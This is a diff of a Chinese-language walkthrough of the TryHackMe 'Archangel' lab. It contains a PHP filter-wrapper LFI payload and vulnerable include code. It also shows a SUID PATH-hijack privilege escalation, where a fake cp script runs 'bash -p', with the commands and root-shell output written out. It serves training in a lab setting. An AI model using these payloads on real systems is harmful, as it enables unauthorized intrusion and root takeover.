@@ -51,7 +51,7 @@ Target: http://10.10.228.134/
 
 查看网页源代码，在```Send us a mail```里发现一个域名，把```mafialive.thm```写进host文件
 
-echo "10.10.228.134 mafialive.thm" >> /etc/hosts
+```echo "10.10.228.134 mafialive.thm" >> /etc/hosts```
 
 打开mafialive.thm发现flag1
 
@@ -83,7 +83,7 @@ Target: http://mafialive.thm/
 我们用php伪协议输出整个网页的源代码，payloadr如下
 
 ```
-http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
 ```
 打印出了test.php的源代码，拿到flag2
 
@@ -94,12 +94,12 @@ http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/
                 return strpos($str, $substr) !== false;
             }
 
-	    if(isset($_GET["view"])){
-	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
-            	include $_GET['view'];
+      if(isset($_GET["view"])){
+      if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
+              include $_GET['view'];
             }else{
 
-		echo 'Sorry, Thats not allowed';
+    echo 'Sorry, Thats not allowed';
             }
  ?>
 ```
@@ -255,7 +255,9 @@ $
 
 在```/home/archangel/secret```拿到第二个user.txt
 
-同文件夹有一个backup文件有SUID权限，下载到靶机用strings命令分析，发现有一个shell命令是：
+# 提权
+
+同文件夹有一个backup文件有SUID权限，下载到靶机用strings命令分析，发现有一个shell片段是：
 ```
 ┌──(root💀kali)-[~/tryhackme/Archangel]
 └─# strings backup
@@ -275,5 +277,78 @@ u+UH
 cp /home/user/archangel/myfiles/* /opt/backupfiles
 ```
 
+## 分析
 
+我们观察上面这一行shell代码
+```
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+```
 
+代码本身是说把```/home/user/archangel/myfiles/*```上的内容通过cp命令拷贝到```/opt/backupfiles```
+
+我们知道，SUID文件是普通用户能够以root运行的文件，这个cp在这个文件虽然是普通用户组发出的命令，但是却是以root身份运行的，也就是说如果我们能够劫持这个命令，改写它的内容，我们就可以利用它来提权。
+
+在linux里，所有用户命令都存储在他的$PATH环境变量里，当我们在终端敲下一个个命令时，linux服务器会从当下用户的环境变量路径里一个个的查找有没有这个命令。如果命令的binary文件存在则执行，不存在则报```command not found```。
+
+## 开始提权
+
+### 查看当前用户的环境变量$PATH
+```
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+
+### 把home目录/home/archangel新增到环境变量$PATH当中
+```
+archangel@ubuntu:~$ export PATH=/home/archangel:$PATH
+export PATH=/home/archangel:$PATH
+archangel@ubuntu:~$ echo $PATH
+echo $PATH
+/home/archangel:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+
+### 在新加的$PATH路径下创建一个cp文件，并且给与执行权限
+```
+archangel@ubuntu:~$ touch cp
+touch cp
+archangel@ubuntu:~$ chmod +x cp
+chmod +x cp
+```
+
+### 把下面代码添加到新建的cp文件中
+```
+#!/bin/bash
+bash -p
+```
+
+### 查看cp文件
+```
+archangel@ubuntu:~$ cat cp
+cat cp
+#!/bin/bash
+bash -p
+```
+
+### 万事具备，执行SUID文件backup,提权到root
+```
+archangel@ubuntu:~/secret$ ./backup
+./backup
+root@ubuntu:~/secret# id
+id
+uid=0(root) gid=0(root) groups=0(root),1001(archangel)
+root@ubuntu:~/secret# whoami
+whoami
+root
+root@ubuntu:~/secret# cat /root/root.txt
+cat /root/root.txt
+```
+
+# 总结
+精彩的靶机，学习到很多新知识。LFI拿shell一般有两种姿势：
+1. LFI+上传文件getshell
+
+2. LFI+文件解析漏洞getshell
+
+本文用的是第二种。关于第一种方法，我在[这个靶机](https://www.jianshu.com/p/2c1eb523bec3)里有记录
+
+提权方面，利用了修改环境变量$PATH的方式，这种提权方法需要和SUID结合。本文修改了cp命令，但是也可能修改的是其他命令。比如mv,tar等，这个要根据靶机具体的情况。
